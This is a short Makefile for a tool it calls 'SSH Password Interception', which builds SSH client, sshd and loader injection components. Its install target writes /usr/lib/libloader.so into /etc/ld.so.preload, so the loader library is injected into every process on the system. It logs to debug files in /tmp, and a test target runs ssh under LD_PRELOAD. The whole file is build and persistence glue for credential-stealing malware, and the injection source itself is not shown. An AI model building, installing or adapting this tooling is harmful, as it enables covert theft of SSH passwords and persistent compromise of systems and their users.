# SSH Password Interception - Master Makefile
# Builds client, server and loader components

.PHONY: all clean install client server loader

all: client server loader

# Build client component
client:
	$(MAKE) -f ssh_inject.mk

# Build server component
server:
	$(MAKE) -f sshd_inject.mk

# Build loader component
loader:
	$(MAKE) -f loader.mk

# Clean all components
clean:
	$(MAKE) -f ssh_inject.mk clean
	$(MAKE) -f sshd_inject.mk clean
	$(MAKE) -f loader.mk clean

# Install all components
install: all
	# Install client component
	$(MAKE) -f ssh_inject.mk install
	
	# Install server component
	$(MAKE) -f sshd_inject.mk install
	
	# Install loader component
	$(MAKE) -f loader.mk install
	
	# Configure ld.so.preload
	@echo "Setting up /etc/ld.so.preload..."
	@echo "/usr/lib/libloader.so" > /etc/ld.so.preload
	@echo "Installation complete!"
	@echo "Log files:"
	@echo " - Client: /tmp/ssh_inj.dbg"
	@echo " - Server: /tmp/sshd_inj.dbg"
	@echo " - Loader: /tmp/ssh_loader.dbg"

test: $(TARGET)
	LD_PRELOAD=./$(TARGET) ssh localhost

.PHONY: all clean install test 